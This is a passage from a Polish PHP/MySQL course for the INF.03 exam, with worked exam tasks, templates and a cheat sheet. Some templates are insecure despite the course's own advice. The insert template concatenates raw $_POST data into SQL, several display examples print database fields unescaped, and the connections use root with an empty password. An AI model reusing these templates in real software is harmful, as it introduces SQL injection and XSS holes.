+    $conn = mysqli_connect("localhost", "root", "", "baza");
+    // ... kod ...
+    mysqli_close($conn);  // ✅ Zamknij połączenie (OBOWIĄZKOWE!)
+?>
+```
+
+### **4. Używanie == zamiast ===**
+
+**Błąd:**
+```php
+<?php
+    $a = 0;
+    $b = false;
+    
+    if ($a == $b) {  // ❌ TRUE! (0 == false)
+        echo "Równe";
+    }
+?>
+```
+
+**Rozwiązanie:**
+```php
+<?php
+    if ($a === $b) {  // ✅ FALSE (różne typy)
+        echo "Równe";
+    }
+?>
+```
+
+### **5. Zapomnienie o enctype w formularzu**
+
+**Błąd:**
+```html
+<!-- ❌ Brak enctype -->
+<form method="POST" action="upload.php">
+    <input type="file" name="plik">
+</form>
+```
+
+**Rozwiązanie:**
+```html
+<!-- ✅ Z enctype -->
+<form method="POST" action="upload.php" enctype="multipart/form-data">
+    <input type="file" name="plik">
+</form>
+```
+
+---
+
+## **Podsumowanie - co musisz umieć na egzamin INF.03**
+
+### ✅ **Podstawy PHP**
+- Znaczniki `<?php ?>`
+- `echo`, `print`
+- Zmienne i typy danych
+- Operatory
+
+### ✅ **Struktury kontrolne**
+- `if`, `else`, `elseif`
+- `switch`
+- Pętle: `for`, `while`, `foreach`
+- `break`, `continue`
+
+### ✅ **Tablice**
+- Tworzenie (indeksowane i asocjacyjne)
+- Operacje: `count()`, `in_array()`, `array_push()`, etc.
+- Przechodzenie przez tablice
+
+### ✅ **Funkcje**
+- Definiowanie funkcji
+- Parametry i wartości domyślne
+- Zwracanie wartości (`return`)
+- Funkcje wbudowane
+
+### ✅ **Formularze**
+- Odbieranie danych: `$_POST`, `$_GET`
+- Walidacja danych
+- Zabezpieczanie: `htmlspecialchars()`
+
+### ✅ **Bazy danych MySQL**
+- Połączenie z bazą (`mysqli`)
+- SELECT, INSERT, UPDATE, DELETE
+- **Prepared Statements** (najważniejsze!)
+- Wyświetlanie wyników
+
+### ✅ **Pliki**
+- Odczyt: `file_get_contents()`, `fopen()`
+- Zapis: `file_put_contents()`
+- Upload plików
+
+### ✅ **Sesje i ciasteczka**
+- `session_start()`, `$_SESSION`
+- `setcookie()`, `$_COOKIE`
+- System logowania
+
+### ✅ **Bezpieczeństwo**
+- SQL Injection → Prepared Statements
+- XSS → `htmlspecialchars()`
+- Hashowanie haseł → `password_hash()`, `password_verify()`
+
+---
+
+## **Praktyczne zadania do ćwiczenia**
+
+### **Zadanie 1: Kalkulator**
+Stwórz formularz z dwoma polami liczbowymi i wyborem operacji (+, -, *, /). Wyświetl wynik.
+
+**Wymagania:**
+- Walidacja danych (czy to liczby)
+- Obsługa dzielenia przez zero
+- Wyświetlanie historii obliczeń
+
+### **Zadanie 2: Księga gości**
+Stwórz księgę gości z możliwością dodawania komentarzy.
+
+**Wymagania:**
+- Formularz: imię, email, treść komentarza
+- Zapis do bazy danych
+- Wyświetlanie wszystkich komentarzy
+- Walidacja danych
+- Zabezpieczenie przed XSS
+
+### **Zadanie 3: System logowania**
+Zbuduj kompletny system rejestracji i logowania.
+
+**Wymagania:**
+- Rejestracja z hashowaniem hasła
+- Logowanie z weryfikacją
+- Panel użytkownika (dostępny tylko po zalogowaniu)
+- Wylogowanie
+- Zabezpieczenie przed SQL Injection
+
+### **Zadanie 4: Lista zadań (TODO)**
+Aplikacja do zarządzania zadaniami.
+
+**Wymagania:**
+- Dodawanie zadań
+- Oznaczanie jako wykonane
+- Usuwanie zadań
+- Edycja zadań
+- Zapis w bazie danych
+
+### **Zadanie 5: Galeria zdjęć**
+System uploadu i wyświetlania zdjęć.
+
+**Wymagania:**
+- Upload zdjęć (jpg, png, gif)
+- Walidacja typu i rozmiaru pliku
+- Zapis nazw plików w bazie
+- Wyświetlanie miniaturek
+- Usuwanie zdjęć
+
+---
+
+## **TYPOWE ZADANIA EGZAMINACYJNE - ROZWIĄZANE KROK PO KROKU**
+
+### **Zadanie typu 1: "Wyświetl produkty z kategorii X"**
+
+**Polecenie:** *Napisz skrypt PHP, który wyświetli w tabeli HTML wszystkie produkty z kategorii "elektronika", które kosztują więcej niż 100 zł, posortowane malejąco według ceny.*
+
+**Rozwiązanie krok po kroku:**
+
+```php
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <title>Produkty</title>
+    <style>
+        table { border-collapse: collapse; width: 100%; }
+        th, td { border: 1px solid black; padding: 8px; }
+        th { background-color: #333; color: white; }
+    </style>
+</head>
+<body>
+    <h2>Produkty z kategorii Elektronika (droższe niż 100 zł)</h2>
+    
+    <?php
+    // Krok 1: Połączenie z bazą
+    $conn = mysqli_connect("localhost", "root", "", "sklep");
+    
+    // Krok 2: Sprawdzenie połączenia
+    if (!$conn) {
+        die("Błąd połączenia: " . mysqli_connect_error());
+    }
+    
+    // Krok 3: Ustawienie UTF-8
+    mysqli_set_charset($conn, "utf8");
+    
+    // Krok 4: Zapytanie SQL
+    $sql = "SELECT nazwa, cena, opis 
+            FROM produkty 
+            WHERE kategoria = 'elektronika' AND cena > 100 
+            ORDER BY cena DESC";
+    
+    // Krok 5: Wykonanie zapytania
+    $wynik = mysqli_query($conn, $sql);
+    
+    // Krok 6: Sprawdzenie czy są wyniki
+    if (mysqli_num_rows($wynik) > 0) {
+        
+        // Krok 7: Rozpoczęcie tabeli
+        echo "<table>";
+        echo "<tr><th>Nazwa</th><th>Cena</th><th>Opis</th></tr>";
+        
+        // Krok 8: Pętla while - wyświetlanie wierszy
+        while ($produkt = mysqli_fetch_array($wynik)) {
+            echo "<tr>";
+            echo "<td>" . $produkt["nazwa"] . "</td>";
+            echo "<td>" . $produkt["cena"] . " zł</td>";
+            echo "<td>" . $produkt["opis"] . "</td>";
+            echo "</tr>";
+        }
+        
+        echo "</table>";
+        
+    } else {
+        echo "<p>Brak produktów spełniających kryteria</p>";
+    }
+    
+    // Krok 9: ZAMKNIĘCIE połączenia (OBOWIĄZKOWE!)
+    mysqli_close($conn);
+    ?>
+</body>
+</html>
+```
+
+### **Zadanie typu 2: "Policz ile zamówień złożył każdy klient"**
+
+**Polecenie:** *Napisz zapytanie SQL, które wyświetli imię i nazwisko klienta oraz liczbę jego zamówień. Pokaż tylko klientów którzy złożyli więcej niż 3 zamówienia.*
+
+**Rozwiązanie:**
+
+```sql
+SELECT klienci.imie, klienci.nazwisko, COUNT(zamowienia.id) as liczba_zamowien
+FROM klienci
+INNER JOIN zamowienia ON klienci.id = zamowienia.klient_id
+GROUP BY klienci.id
+HAVING liczba_zamowien > 3
+ORDER BY liczba_zamowien DESC;
+```
+
+**W PHP:**
+
+```php
+<?php
+$conn = mysqli_connect("localhost", "root", "", "sklep");
+mysqli_set_charset($conn, "utf8");
+
+$sql = "SELECT klienci.imie, klienci.nazwisko, COUNT(zamowienia.id) as liczba_zamowien
+        FROM klienci
+        INNER JOIN zamowienia ON klienci.id = zamowienia.klient_id
+        GROUP BY klienci.id
+        HAVING liczba_zamowien > 3
+        ORDER BY liczba_zamowien DESC";
+
+$wynik = mysqli_query($conn, $sql);
+
+echo "<h3>Najaktywniejsz klienci (>3 zamówienia):</h3>";
+echo "<ol>";
+
+while ($klient = mysqli_fetch_array($wynik)) {
+    echo "<li>" . $klient["imie"] . " " . $klient["nazwisko"];
+    echo " - " . $klient["liczba_zamowien"] . " zamówień</li>";
+}
+
+echo "</ol>";
+
+mysqli_close($conn);
+?>
+```
+
+### **Zadanie typu 3: "Formularz z zapisem do bazy"**
+
+**Polecenie:** *Stwórz formularz rejestracji użytkownika (imię, email, miasto) i skrypt PHP zapisujący dane do bazy.*
+
+**formularz.html:**
+```html
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <title>Rejestracja</title>
+</head>
+<body>
+    <h2>Formularz rejestracji</h2>
+    
+    <form method="POST" action="zapisz.php">
+        <label>Imię:</label><br>
+        <input type="text" name="imie" required><br><br>
+        
+        <label>Email:</label><br>
+        <input type="email" name="email" required><br><br>
+        
+        <label>Miasto:</label><br>
+        <select name="miasto" required>
+            <option value="">Wybierz miasto</option>
+            <option value="Warszawa">Warszawa</option>
+            <option value="Kraków">Kraków</option>
+            <option value="Gdańsk">Gdańsk</option>
+        </select><br><br>
+        
+        <button type="submit">Zarejestruj się</button>
+    </form>
+</body>
+</html>
+```
+
+**zapisz.php:**
+```php
+<?php
+// Sprawdzenie czy formularz został wysłany
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    
+    // Połączenie z bazą
+    $conn = mysqli_connect("localhost", "root", "", "portal");
+    
+    if (!$conn) {
+        die("Błąd połączenia: " . mysqli_connect_error());
+    }
+    
+    mysqli_set_charset($conn, "utf8");
+    
+    // Odbieranie danych z formularza
+    $imie = $_POST["imie"];
+    $email = $_POST["email"];
+    $miasto = $_POST["miasto"];
+    
+    // Zabezpieczenie przed SQL Injection
+    $imie = mysqli_real_escape_string($conn, $imie);
+    $email = mysqli_real_escape_string($conn, $email);
+    $miasto = mysqli_real_escape_string($conn, $miasto);
+    
+    // Zapytanie INSERT z aktualną datą
+    $sql = "INSERT INTO uzytkownicy (imie, email, miasto, data_rejestracji) 
+            VALUES ('$imie', '$email', '$miasto', CURRENT_DATE())";
+    
+    // Wykonanie zapytania
+    if (mysqli_query($conn, $sql)) {
+        $noweID = mysqli_insert_id($conn);
+        echo "<h3>✅ Rejestracja pomyślna!</h3>";
+        echo "<p>Twoje ID: $noweID</p>";
+        echo "<p>Imię: $imie</p>";
+        echo "<p>Email: $email</p>";
+        echo "<p>Miasto: $miasto</p>";
+        echo "<a href='lista.php'>Zobacz wszystkich użytkowników</a>";
+    } else {
+        echo "<h3>❌ Błąd rejestracji</h3>";
+        echo "<p>Szczegóły: " . mysqli_error($conn) . "</p>";
+    }
+    
+    // Zamknięcie połączenia
+    mysqli_close($conn);
+    
+} else {
+    echo "Nieprawidłowe żądanie";
+}
+?>
+```
+
+### **Zadanie typu 4: "Oblicz średnią cenę w kategorii"**
+
+**Polecenie:** *Napisz zapytanie SQL, które obliczy średnią cenę produktów w każdej kategorii. Wyświetl tylko kategorie gdzie średnia cena jest wyższa niż 200 zł.*
+
+**Rozwiązanie SQL:**
+```sql
+SELECT kategoria, AVG(cena) as srednia_cena, COUNT(*) as ilosc_produktow
+FROM produkty
+GROUP BY kategoria
+HAVING srednia_cena > 200
+ORDER BY srednia_cena DESC;
+```
+
+**W PHP:**
+```php
+<?php
+$conn = mysqli_connect("localhost", "root", "", "sklep");
+mysqli_set_charset($conn, "utf8");
+
+$sql = "SELECT kategoria, AVG(cena) as srednia_cena, COUNT(*) as ilosc_produktow
+        FROM produkty
+        GROUP BY kategoria
+        HAVING srednia_cena > 200
+        ORDER BY srednia_cena DESC";
+
+$wynik = mysqli_query($conn, $sql);
+
+echo "<h3>Kategorie premium (śr. cena > 200 zł):</h3>";
+echo "<table border='1'>";
+echo "<tr><th>Kategoria</th><th>Średnia cena</th><th>Liczba produktów</th></tr>";
+
+while ($kategoria = mysqli_fetch_array($wynik)) {
+    $srednia = round($kategoria["srednia_cena"], 2);
+    echo "<tr>";
+    echo "<td>" . $kategoria["kategoria"] . "</td>";
+    echo "<td>" . $srednia . " zł</td>";
+    echo "<td>" . $kategoria["ilosc_produktow"] . "</td>";
+    echo "</tr>";
+}
+
+echo "</table>";
+
+mysqli_close($conn);
+?>
+```
+
+### **Zadanie typu 5: "Aktualizuj dane na podstawie warunku"**
+
+**Polecenie:** *Napisz skrypt PHP, który zwiększy cenę wszystkich produktów z kategorii "sport" o 15%.*
+
+**Rozwiązanie:**
+```php
+<?php
+$conn = mysqli_connect("localhost", "root", "", "sklep");
+
+if (!$conn) {
+    die("Błąd połączenia: " . mysqli_connect_error());
+}
+
+mysqli_set_charset($conn, "utf8");
+
+// Zapytanie UPDATE
+$sql = "UPDATE produkty SET cena = cena * 1.15 WHERE kategoria = 'sport'";
+
+if (mysqli_query($conn, $sql)) {
+    $zaktualizowane = mysqli_affected_rows($conn);
+    echo "✅ Zaktualizowano $zaktualizowane produktów";
+} else {
+    echo "❌ Błąd: " . mysqli_error($conn);
+}
+
+mysqli_close($conn);
+?>
+```
+
+---
+
+## **Przydatne linki i zasoby**
+
+- **Oficjalna dokumentacja PHP:** https://www.php.net/manual/pl/
+- **W3Schools PHP Tutorial:** https://www.w3schools.com/php/
+- **PHP: The Right Way:** https://phptherightway.com/
+- **XAMPP:** https://www.apachefriends.org/
+- **PHPMyAdmin:** Dostępny w XAMPP (localhost/phpmyadmin)
+
+---
+
+## **Końcowe wskazówki dla uczniów**
+
+### **Jak się uczyć PHP?**
+
+1. **Ćwicz regularnie** - programowanie to umiejętność praktyczna
+2. **Pisz kod ręcznie** - nie kopiuj ślepo
+3. **Eksperymentuj** - zmieniaj kod i patrz co się stanie
+4. **Debuguj** - używaj `var_dump()`, `print_r()` do sprawdzania zmiennych
+5. **Czytaj kod innych** - ucz się z przykładów
+
+### **Podczas nauki włącz wyświetlanie błędów:**
+
+```php
+<?php
+    error_reporting(E_ALL);
+    ini_set('display_errors', 1);
+?>
+```
+
+### **Jak przygotować się do egzaminu INF.03?**
+
+1. ✅ Zrób WSZYSTKIE przykłady z kursu
+2. ✅ Rozwiąż zadania praktyczne
+3. ✅ Przećwicz przykładowe arkusze egzaminacyjne
+4. ✅ Naucz się na pamięć składni podstawowych konstrukcji
+5. ✅ Potrenuj tworzenie prostych aplikacji od zera
+6. ✅ Zwróć szczególną uwagę na:
+   - Formularze (POST/GET)
+   - Połączenie z bazą MySQL
+   - Prepared Statements
+   - SELECT, INSERT, UPDATE, DELETE
+   - Pętle (szczególnie foreach)
+   - Walidacja danych
+
+### **Złote zasady programisty PHP:**
+
+1. **ZAWSZE** używaj Prepared Statements
+2. **ZAWSZE** używaj `htmlspecialchars()` przy wyświetlaniu danych użytkownika
+3. **NIGDY** nie przechowuj haseł w czystej postaci
+4. **ZAWSZE** waliduj dane wejściowe
+5. **Testuj** swój kod - czy działa poprawnie?
+6. **Komentuj** skomplikowane fragmenty
+7. **Używaj znaczących nazw** zmiennych i funkcji
+
+---
+
+## **ŚCIĄGAWKA - SZYBKIE POWTÓRKI PRZED EGZAMINEM INF.03**
+
+### **FUNKCJE mysqli - MUSISZ ZNAĆ NA PAMIĘĆ!**
+
+```php
+// 1. POŁĄCZENIE
+$conn = mysqli_connect("localhost", "root", "", "nazwa_bazy");
+if (!$conn) die("Błąd: " . mysqli_connect_error());
+mysqli_set_charset($conn, "utf8");
+
+// Alternatywnie - połączenie bez bazy + wybór bazy
+$conn = mysqli_connect("localhost", "root", "");
+mysqli_select_db($conn, "nazwa_bazy");
+
+// 2. SELECT - pobieranie
+$sql = "SELECT * FROM tabela";
+$wynik = mysqli_query($conn, $sql);
+
+// Sprawdzenie czy są wyniki
+if (mysqli_num_rows($wynik) > 0) {
+    // Pobieranie z mysqli_fetch_array() - dostęp po nazwie kolumny
+    while ($wiersz = mysqli_fetch_array($wynik)) {
+        echo $wiersz["kolumna"];
+    }
+    
+    // LUB mysqli_fetch_row() - dostęp tylko po indeksie [0], [1], [2]...
+    while ($wiersz = mysqli_fetch_row($wynik)) {
+        echo $wiersz[0];  // pierwsza kolumna
+    }
+}
+
+// Sprawdzenie liczby kolumn (rzadko używane)
+$liczba_kolumn = mysqli_num_fields($wynik);
+
+// 3. INSERT - dodawanie
+$sql = "INSERT INTO tabela (kol1, kol2) VALUES ('war1', 'war2')";
+if (mysqli_query($conn, $sql)) {
+    $noweID = mysqli_insert_id($conn);  // ID nowo dodanego rekordu
+    echo "Dodano rekord o ID: $noweID";
+} else {
+    echo "Błąd: " . mysqli_error($conn);  // Wyświetlenie błędu
+}
+
+// 4. UPDATE - aktualizacja
+$sql = "UPDATE tabela SET kolumna='nowa' WHERE id=1";
+mysqli_query($conn, $sql);
+$zmienione = mysqli_affected_rows($conn);  // Ile wierszy zmieniono
+
+// 5. DELETE - usuwanie
+$sql = "DELETE FROM tabela WHERE id=1";
+mysqli_query($conn, $sql);
+
+// 6. Zabezpieczenie przed SQL Injection
+$tekst_od_uzytkownika = mysqli_real_escape_string($conn, $_POST["dane"]);
+
+// 7. ZAMKNIJ (OBOWIĄZKOWO NA EGZAMINIE!)
+mysqli_close($conn);
+```
+
+**⚠️ UWAGA EGZAMIN:** Wszystkie powyższe funkcje są z oficjalnej dokumentacji CKE i mogą pojawić się na egzaminie!
+
+### **ZAPYTANIA SQL - NAJCZĘŚCIEJ NA EGZAMINIE**
+
+```sql
+-- SELECT z WHERE
+SELECT * FROM produkty WHERE cena > 100;
+
+-- SELECT z LIKE (wyszukiwanie)
+SELECT * FROM klienci WHERE nazwisko LIKE 'Kow%';
+
+-- SELECT z ORDER BY (sortowanie)
+SELECT * FROM produkty ORDER BY cena DESC;
+
+-- SELECT z LIMIT
+SELECT * FROM produkty ORDER BY cena DESC LIMIT 5;
+
+-- JOIN (łączenie tabel)
+SELECT klienci.imie, zamowienia.produkt 
+FROM zamowienia 
+INNER JOIN klienci ON zamowienia.klient_id = klienci.id;
+
+-- GROUP BY (grupowanie)
+SELECT kategoria, COUNT(*) as ilosc 
+FROM produkty 
+GROUP BY kategoria;
+
+-- GROUP BY z HAVING
+SELECT kategoria, COUNT(*) as ilosc 
+FROM produkty 
+GROUP BY kategoria 
+HAVING ilosc > 10;
+
+-- Funkcje agregujące
+SELECT COUNT(*) FROM produkty;              -- Liczba
+SELECT AVG(cena) FROM produkty;             -- Średnia
+SELECT SUM(cena) FROM produkty;             -- Suma
+SELECT MIN(cena), MAX(cena) FROM produkty;  -- Min i Max
+
+-- Funkcje daty
+INSERT INTO zamowienia (data) VALUES (CURRENT_DATE());
+SELECT NOW() as teraz;
+
+-- DISTINCT (unikalne)
+SELECT DISTINCT miasto FROM klienci;
+
+-- BETWEEN (zakres)
+SELECT * FROM produkty WHERE cena BETWEEN 50 AND 150;
+
+-- IN (lista wartości)
+SELECT * FROM produkty WHERE kategoria IN ('AGD', 'RTV');
+
+-- ALTER TABLE (modyfikacja struktury)
+ALTER TABLE produkty ADD opis TEXT;
+ALTER TABLE produkty DROP COLUMN stary_kod;
+ALTER TABLE produkty MODIFY cena DECIMAL(10,2);
+```
+
+### **FUNKCJE PHP - NAJWAŻNIEJSZE**
+
+#### **Tekstowe:**
+```php
+strlen($tekst)              // Długość
+strtoupper($tekst)          // WIELKIE LITERY
+strtolower($tekst)          // małe litery
+trim($tekst)                // Usuń spacje
+str_replace("a", "b", $txt) // Zamień a na b
+substr($tekst, 0, 5)        // Pierwsze 5 znaków
+explode(",", "a,b,c")       // String → tablica
+implode(",", $tablica)      // Tablica → string
+```
+
+#### **Tablice:**
+```php
+count($tab)                 // Liczba elementów
+in_array($val, $tab)        // Czy istnieje?
+array_push($tab, $val)      // Dodaj na końcu
+sort($tab)                  // Sortuj
+```
+
+#### **Sprawdzanie:**
+```php
+isset($zmienna)             // Czy istnieje?
+empty($zmienna)             // Czy pusta?
+is_numeric($war)            // Czy liczba?
+```
+
+#### **Data i czas:**
+```php
+date("Y-m-d")              // 2025-01-15
+date("H:i:s")              // 14:30:45
+time()                     // Timestamp
+```
+
+### **FORMULARZE - SCHEMAT**
+
+**HTML:**
+```html
+<form method="POST" action="przetwarzanie.php">
+    <input type="text" name="pole" required>
+    <button type="submit">Wyślij</button>
+</form>
+```
+
+**PHP:**
+```php
+<?php
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $wartosc = $_POST["pole"];
+    // Przetwarzanie...
+}
+?>
+```
+
+### **KOMPLETNY SZABLON - WYŚWIETLANIE Z BAZY**
+
+```php
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <title>Strona</title>
+    <link rel="stylesheet" href="styl.css">
+</head>
+<body>
+    <header>
+        <h1>Nagłówek</h1>
+    </header>
+    
+    <section>
+        <?php
+        $conn = mysqli_connect("localhost", "root", "", "baza");
+        
+        if (!$conn) {
+            die("Błąd: " . mysqli_connect_error());
+        }
+        
+        mysqli_set_charset($conn, "utf8");
+        
+        $sql = "SELECT * FROM tabela";
+        $wynik = mysqli_query($conn, $sql);
+        
+        if (mysqli_num_rows($wynik) > 0) {
+            echo "<table>";
+            while ($wiersz = mysqli_fetch_array($wynik)) {
+                echo "<tr>";
+                echo "<td>" . $wiersz["kolumna"] . "</td>";
+                echo "</tr>";
+            }
+            echo "</table>";
+        }
+        
+        mysqli_close($conn);
+        ?>
+    </section>
+    
+    <footer>
+        <p>Stopka</p>
+    </footer>
+</body>
+</html>
+```
+
+### **KOMPLETNY SZABLON - DODAWANIE DO BAZY**
+
+```php
+<?php
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $conn = mysqli_connect("localhost", "root", "", "baza");
+    mysqli_set_charset($conn, "utf8");
+    
+    $pole1 = $_POST["pole1"];
+    $pole2 = $_POST["pole2"];
+    
+    $sql = "INSERT INTO tabela (kolumna1, kolumna2) VALUES ('$pole1', '$pole2')";
+    
+    if (mysqli_query($conn, $sql)) {
+        echo "Dodano pomyślnie!";
+    } else {
+        echo "Błąd: " . mysqli_error($conn);
+    }
+    
+    mysqli_close($conn);
+}
+?>
+
+<form method="POST">
+    <input type="text" name="pole1" required>
+    <input type="text" name="pole2" required>
+    <button type="submit">Dodaj</button>
+</form>
+```
+
+### **CHECKLIST NA DZIEŃ PRZED EGZAMINEM**
+
+#### **Funkcje mysqli (powtórz!):**
+- [ ] `mysqli_connect()` - połączenie
+- [ ] `mysqli_query()` - wykonanie zapytania
+- [ ] `mysqli_fetch_array()` - pobieranie wiersza
+- [ ] `mysqli_num_rows()` - liczba wierszy
+- [ ] `mysqli_affected_rows()` - zmienione wiersze
+- [ ] `mysqli_close()` - ZAMKNIJ!
+- [ ] `mysqli_error()` - komunikat błędu
+
+#### **SQL (powtórz!):**
+- [ ] SELECT ... FROM ... WHERE ... ORDER BY ... LIMIT
+- [ ] INSERT INTO ... VALUES
+- [ ] UPDATE ... SET ... WHERE
+- [ ] DELETE FROM ... WHERE
+- [ ] INNER JOIN ... ON
+- [ ] GROUP BY ... HAVING
+- [ ] COUNT, AVG, SUM, MIN, MAX
+- [ ] CURRENT_DATE(), NOW()
+- [ ] LIKE, BETWEEN, IN, DISTINCT
+
+#### **PHP (powtórz!):**
+- [ ] Pętla `while` z `mysqli_fetch_array()`
+- [ ] `$_POST`, `$_GET`
+- [ ] `isset()`, `empty()`
+- [ ] `htmlspecialchars()`
+- [ ] `date()`, `time()`
+- [ ] `count()`, `in_array()`
+- [ ] `explode()`, `implode()`
+
+#### **Na egzaminie PAMIĘTAJ:**
+- [ ] Zaimportuj bazę SQL do phpMyAdmin
+- [ ] Wykonaj każde zapytanie i zrób zrzut ekranu
+- [ ] Zapisz zapytania do `kwerendy.txt`
+- [ ] Sprawdź czy Apache i MySQL działają
+- [ ] Testuj stronę w przeglądarce po każdej zmianie
+- [ ] ZAWSZE zamykaj połączenie `mysqli_close()`
+- [ ] Używaj `utf8` dla polskich znaków
+- [ ] Nazywaj pliki dokładnie jak w poleceniu
+
+---
+
+**Powodzenia na egzaminie INF.03! 🚀**
+
+Pamiętaj: Praktyka czyni mistrza. Im więcej kodu napiszesz, tym lepiej będziesz programować!
+
+---
+
+*Kurs stworzony specjalnie dla uczniów przygotowujących się do egzaminu zawodowego INF.03*
+*Wersja rozszerzona i kompleksowa - wszystko czego potrzebujesz w jednym miejscu!*
